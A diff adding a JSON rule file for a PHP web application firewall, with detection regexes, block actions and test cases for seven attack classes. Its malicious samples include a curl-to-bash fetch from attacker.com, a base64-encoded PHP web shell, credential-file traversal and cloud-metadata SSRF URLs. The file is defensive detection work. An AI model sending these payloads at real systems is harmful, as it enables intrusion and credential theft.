@@ -1,0 +1,316 @@
+{
+  "schema_version": "1.0.0",
+  "last_updated": "2026-10-25T01:57:00Z",
+  "threat_taxonomy": [
+    "CGI_ARGUMENT_INJECTION",
+    "PHP_OBJECT_INJECTION",
+    "STREAM_WRAPPER_EXPLOITATION",
+    "PATH_TRAVERSAL_AND_POISONING",
+    "COMMAND_INJECTION_AND_CHAINING",
+    "SQL_INJECTION",
+    "WEB_SHELL_UPLOAD_AND_PERSISTENCE",
+    "SERVER_SIDE_REQUEST_FORGERY",
+    "TYPE_JUGGLING_AND_LOGIC_BYPASS"
+  ],
+  "signatures": [
+    {
+      "id": "THREAT-PHP-CGI-001",
+      "name": "PHP-CGI Argument Injection & Best-Fit Unicode Bypass",
+      "category": "CGI_ARGUMENT_INJECTION",
+      "cve_references": [
+        "CVE-2024-4577",
+        "CVE-2012-1823"
+      ],
+      "cwe_id": "CWE-88",
+      "cvss_v4_score": 9.8,
+      "epss_percentile": 0.985,
+      "target_surfaces": [
+        "QUERY_STRING",
+        "REQUEST_URI"
+      ],
+      "obfuscation_countermeasures": [
+        "URL_DECODE_RECURSIVE",
+        "BEST_FIT_UNICODE_NORMALIZATION",
+        "CASE_INSENSITIVE_FOLDING"
+      ],
+      "detection": {
+        "type": "REGEX",
+        "pattern": "(?:-|%2d|%ad)[-\\s]*(?:d|%64|%44)?\\s*(?:allow_url_include|auto_prepend_file|auto_append_file|disable_functions|open_basedir|cgi\\.fix_pathinfo|safe_mode)",
+        "pre_filter": "-d"
+      },
+      "action": {
+        "enforce_action": "BLOCK_TERMINATE",
+        "http_status_code": 403,
+        "remediation_hint": "Disable legacy PHP-CGI handler; enforce FastCGI/PHP-FPM."
+      },
+      "test_cases": {
+        "malicious_samples": [
+          "?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input",
+          "?%ad+d+allow_url_include%3d1",
+          "?-d+disable_functions=none"
+        ],
+        "benign_samples": [
+          "?download=1&item=blue-dress",
+          "?search=best-discount-offers",
+          "?id=1024"
+        ]
+      }
+    },
+    {
+      "id": "THREAT-PHP-DESER-001",
+      "name": "Insecure Deserialization & Gadget Chain Injection",
+      "category": "PHP_OBJECT_INJECTION",
+      "cve_references": [
+        "CVE-2023-3824",
+        "CVE-2022-31629"
+      ],
+      "cwe_id": "CWE-502",
+      "cvss_v4_score": 9.8,
+      "epss_percentile": 0.962,
+      "target_surfaces": [
+        "GET_PARAM",
+        "POST_PARAM",
+        "COOKIE",
+        "HTTP_HEADER"
+      ],
+      "obfuscation_countermeasures": [
+        "URL_DECODE_RECURSIVE",
+        "BASE64_DECODE_INSPECTION"
+      ],
+      "detection": {
+        "type": "REGEX",
+        "pattern": "(?:^|;|{|})([OaC]):\\d+:\"[^\"]+\":\\d+:",
+        "pre_filter": "O:"
+      },
+      "action": {
+        "enforce_action": "BLOCK_TERMINATE",
+        "http_status_code": 403,
+        "remediation_hint": "Replace unserialize() with json_decode() or use allowed_classes => false."
+      },
+      "test_cases": {
+        "malicious_samples": [
+          "O:8:\"Exploit\":1:{s:4:\"eval\";s:10:\"phpinfo();\";}",
+          "a:2:{i:0;O:14:\"Monolog\\Logger\":1:{s:8:\"handlers\";a:1:{i:0;O:29:\"Monolog\\Handler\\SyslogHandler\":0:{}}};}",
+          "C:11:\"ArrayObject\":23:{x:i:0;a:0:{};m:a:0:{};}"
+        ],
+        "benign_samples": [
+          "Normal text message about Order ID 1092",
+          "{\"user\":\"alice\",\"role\":\"admin\"}",
+          "Category: Books & Magazines"
+        ]
+      }
+    },
+    {
+      "id": "THREAT-PHP-STREAM-001",
+      "name": "Arbitrary PHP Stream Wrapper Exploitation (LFI/RFI/PHAR)",
+      "category": "STREAM_WRAPPER_EXPLOITATION",
+      "cve_references": [
+        "CVE-2018-17082"
+      ],
+      "cwe_id": "CWE-98",
+      "cvss_v4_score": 9.4,
+      "epss_percentile": 0.941,
+      "target_surfaces": [
+        "GET_PARAM",
+        "POST_PARAM",
+        "REQUEST_URI"
+      ],
+      "obfuscation_countermeasures": [
+        "URL_DECODE_RECURSIVE",
+        "CASE_INSENSITIVE_FOLDING"
+      ],
+      "detection": {
+        "type": "REGEX",
+        "pattern": "(?:php|data|expect|phar|zip|glob|compress\\.zlib|compress\\.bzip2)://",
+        "pre_filter": "://"
+      },
+      "action": {
+        "enforce_action": "BLOCK_TERMINATE",
+        "http_status_code": 403,
+        "remediation_hint": "Enforce allow_url_include=Off and restrict file inclusions to strictly vetted paths."
+      },
+      "test_cases": {
+        "malicious_samples": [
+          "php://input",
+          "php://filter/read=convert.base64-encode/resource=index.php",
+          "phar://uploads/avatar.jpg/shell.php",
+          "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg=="
+        ],
+        "benign_samples": [
+          "https://example.com/api/v1/resource",
+          "http://localhost:8080/dashboard",
+          "file_name_reference.doc"
+        ]
+      }
+    },
+    {
+      "id": "THREAT-PHP-TRAV-001",
+      "name": "Path Traversal & Null Byte Character Truncation",
+      "category": "PATH_TRAVERSAL_AND_POISONING",
+      "cve_references": [
+        "CVE-2015-3411"
+      ],
+      "cwe_id": "CWE-22",
+      "cvss_v4_score": 8.6,
+      "epss_percentile": 0.912,
+      "target_surfaces": [
+        "GET_PARAM",
+        "POST_PARAM",
+        "REQUEST_URI"
+      ],
+      "obfuscation_countermeasures": [
+        "URL_DECODE_RECURSIVE",
+        "NULL_BYTE_STRIP"
+      ],
+      "detection": {
+        "type": "REGEX",
+        "pattern": "(?:\\.\\.[\\/\\\\]|\\%2e\\%2e[\\/\\\\]|\\0|\\%00)",
+        "pre_filter": ".."
+      },
+      "action": {
+        "enforce_action": "BLOCK_TERMINATE",
+        "http_status_code": 403,
+        "remediation_hint": "Use basename() and realpath() with strict base directory verification."
+      },
+      "test_cases": {
+        "malicious_samples": [
+          "../../../../etc/passwd",
+          "..\\..\\windows\\system32\\cmd.exe",
+          "report.pdf\u0000.php",
+          "%2e%2e/%2e%2e/etc/shadow"
+        ],
+        "benign_samples": [
+          "docs/v2/annual_report.pdf",
+          "user_avatar_102.png",
+          "https://cdn.site.com/assets/js/app.min.js"
+        ]
+      }
+    },
+    {
+      "id": "THREAT-PHP-CMD-001",
+      "name": "OS Command Chaining & Metacharacter Shell Injection",
+      "category": "COMMAND_INJECTION_AND_CHAINING",
+      "cve_references": [
+        "CVE-2021-3129"
+      ],
+      "cwe_id": "CWE-78",
+      "cvss_v4_score": 9.8,
+      "epss_percentile": 0.978,
+      "target_surfaces": [
+        "GET_PARAM",
+        "POST_PARAM",
+        "COOKIE"
+      ],
+      "obfuscation_countermeasures": [
+        "URL_DECODE_RECURSIVE",
+        "BASE64_DECODE_INSPECTION"
+      ],
+      "detection": {
+        "type": "REGEX",
+        "pattern": "(?:;|\\|{1,2}|`|\\$\\()\\s*(?:cat\\s+/etc|whoami|curl\\s+[0-9a-z]|wget\\s+[0-9a-z]|bash\\s+-i|nc\\s+-e|python\\s+-c|id\\b|uname\\s+-a)",
+        "pre_filter": ";"
+      },
+      "action": {
+        "enforce_action": "BLOCK_TERMINATE",
+        "http_status_code": 403,
+        "remediation_hint": "Disable dangerous functions via disable_functions; use escapeshellarg()."
+      },
+      "test_cases": {
+        "malicious_samples": [
+          "127.0.0.1; whoami",
+          "target.com | cat /etc/passwd",
+          "`curl attacker.com/shell.sh | bash`",
+          "test || uname -a"
+        ],
+        "benign_samples": [
+          "Semi-colon usage in literary sentences; like this one.",
+          "Mathematical pipe | logical symbol",
+          "email@test-domain.com"
+        ]
+      }
+    },
+    {
+      "id": "THREAT-PHP-SQLI-001",
+      "name": "High-Confidence SQL Injection (UNION / Time Blind / Boolean)",
+      "category": "SQL_INJECTION",
+      "cve_references": [
+        "CVE-2022-21661"
+      ],
+      "cwe_id": "CWE-89",
+      "cvss_v4_score": 9.1,
+      "epss_percentile": 0.954,
+      "target_surfaces": [
+        "GET_PARAM",
+        "POST_PARAM",
+        "COOKIE"
+      ],
+      "obfuscation_countermeasures": [
+        "URL_DECODE_RECURSIVE",
+        "CASE_INSENSITIVE_FOLDING"
+      ],
+      "detection": {
+        "type": "REGEX",
+        "pattern": "(?:\\bUNION(?:\\s+ALL)?\\s+SELECT\\b|\\b(?:AND|OR)\\s+(?:SLEEP|BENCHMARK|PG_SLEEP)\\s*\\(|\\bSELECT\\b.+\\bFROM\\b.+\\bWHERE\\b.+\\b(?:SLEEP|BENCHMARK)\\b|\\b1=1\\s*--|\\bOR\\s+['\"]?1['\"]?\\s*=\\s*['\"]?1\\b)",
+        "pre_filter": "SELECT"
+      },
+      "action": {
+        "enforce_action": "BLOCK_TERMINATE",
+        "http_status_code": 403,
+        "remediation_hint": "Use prepared statements with PDO or MySQLi."
+      },
+      "test_cases": {
+        "malicious_samples": [
+          "-1 UNION SELECT 1, 2, table_name FROM information_schema.tables --",
+          "admin' OR '1'='1",
+          "1 AND SLEEP(5)--",
+          "SELECT * FROM accounts WHERE id=1 OR 1=1--"
+        ],
+        "benign_samples": [
+          "Select the items you would like to purchase from our store",
+          "union of workers and employees association",
+          "Order item #101 with 1 piece"
+        ]
+      }
+    },
+    {
+      "id": "THREAT-PHP-SSRF-001",
+      "name": "Cloud Metadata & Link-Local SSRF Exfiltration",
+      "category": "SERVER_SIDE_REQUEST_FORGERY",
+      "cve_references": [
+        "CVE-2021-21972"
+      ],
+      "cwe_id": "CWE-918",
+      "cvss_v4_score": 8.8,
+      "epss_percentile": 0.893,
+      "target_surfaces": [
+        "GET_PARAM",
+        "POST_PARAM"
+      ],
+      "obfuscation_countermeasures": [
+        "URL_DECODE_RECURSIVE"
+      ],
+      "detection": {
+        "type": "REGEX",
+        "pattern": "(?:https?://)?(?:169\\.254\\.169\\.254|metadata\\.google\\.internal|100\\.100\\.100\\.200|fd00:ec2::254)",
+        "pre_filter": "169.254"
+      },
+      "action": {
+        "enforce_action": "BLOCK_TERMINATE",
+        "http_status_code": 403,
+        "remediation_hint": "Block outbound requests to cloud link-local addresses at egress firewalls."
+      },
+      "test_cases": {
+        "malicious_samples": [
+          "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+          "http://metadata.google.internal/computeMetadata/v1/",
+          "url=http://169.254.169.254"
+        ],
+        "benign_samples": [
+          "https://aws.amazon.com/ec2/pricing/",
+          "https://cloud.google.com/docs",
+          "ip_address=192.168.1.10"
+        ]
+      }
+    }
+  ]
+}
